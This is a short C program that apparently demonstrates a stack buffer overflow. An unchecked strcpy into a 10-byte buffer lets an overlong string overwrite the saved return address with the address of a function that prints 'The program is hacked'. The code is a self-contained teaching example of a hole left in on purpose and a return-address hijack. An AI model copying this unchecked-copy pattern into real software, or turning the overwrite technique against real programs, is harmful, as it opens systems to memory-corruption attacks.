#include <windows.h>
#include <stdio.h>
#include <string.h>

void CopyString(char *s)
{
	char buf[10];

	strcpy(buf,s);
}

void hacked(void)
{
	while(1)
	  printf("The program is hacked\n");
}


int main()
{
	char	badstr[]="000011112222333344445555";

	DWORD   *pEIP=(DWORD *)&badstr[16];

	*pEIP=(DWORD)hacked;
	

	CopyString(badstr);

	return	0;
}


